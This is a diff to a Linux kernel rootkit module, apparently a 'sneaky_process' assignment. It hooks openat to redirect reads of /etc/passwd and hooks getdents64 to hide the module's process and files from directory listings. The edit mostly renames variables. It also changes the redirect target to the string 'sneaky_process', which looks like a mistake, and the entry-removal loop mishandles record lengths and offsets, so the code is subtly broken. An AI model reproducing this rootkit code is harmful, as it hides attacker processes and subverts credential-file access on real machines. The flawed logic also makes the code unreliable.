@@ -11,9 +11,11 @@
 #include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
+#define TEMPASS "sneaky_process"
+#define ETCPASS "/etc/passwd"
 
-//static int pid;
-//module_param(pid, int, 0);
+// static int pid;
+// module_param(pid, int, 0);
 char *pid = NULL;
 module_param(pid, charp, 0);
 
@@ -50,10 +52,10 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-  char *pathname = (char *)regs->si;
-  if (strcmp(pathname, "/etc/passwd") == 0)
+  char *path_name = (char *)regs->si;
+  if (strcmp(path_name, ETCPASS) == 0)
   {
-    copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
+    copy_to_user(path_name, TEMPASS, strlen(TEMPASS) + 1);
     printk(KERN_INFO "open at attack!");
   }
   return (*original_openat)(regs);
@@ -64,26 +66,29 @@ asmlinkage int (*original_getdents64)(struct pt_regs *regs);
 asmlinkage int sneaky_getdents64(struct pt_regs *regs)
 {
   struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
-  int nread = (*original_getdents64)(regs), off = 0;
-  // printk(KERN_INFO "get sneaky getdents64 with process id %s", sneaky_pid);
+  int nread = (*original_getdents64)(regs);
+  int offset = 0;
 
+  printk(KERN_INFO "get sneaky getdents64 with process id %s", pid);
+  // error or nothing to read
   if (nread <= 0)
   {
-    return 0; // == 0 means nothing to read, and < 0 means error
+    return 0;
   }
 
-  for (off = 0; off < nread;)
+  // for (off = 0; off < nread;)
+  while (offset < nread)
   {
-    struct linux_dirent64 *curDirent = (void *)dirp + off;
-    if ((strcmp(curDirent->d_name, "sneaky_process") == 0) || (strcmp(curDirent->d_name, pid) == 0))
+    struct linux_dirent64 *cur_dirent = (void *)dirp + offset;
+    if ((strcmp(cur_dirent->d_name, pid) == 0) || (strcmp(cur_dirent->d_name, PREFIX) == 0))
     {
-      void *nextDirent = (void *)curDirent + curDirent->d_reclen;
-      int remaining_size = nread - (off + curDirent->d_reclen);
-      memmove(curDirent, nextDirent, remaining_size);
-      nread -= curDirent->d_reclen;
+      void *next_dirent = (void *)cur_dirent + cur_dirent->d_reclen;
+      int remaining_size = nread - (offset + cur_dirent->d_reclen);
+      memmove(cur_dirent, next_dirent, remaining_size);
+      nread -= cur_dirent->d_reclen;
     }
 
-    off += curDirent->d_reclen;
+    offset += cur_dirent->d_reclen;
   }
   return nread;
 }
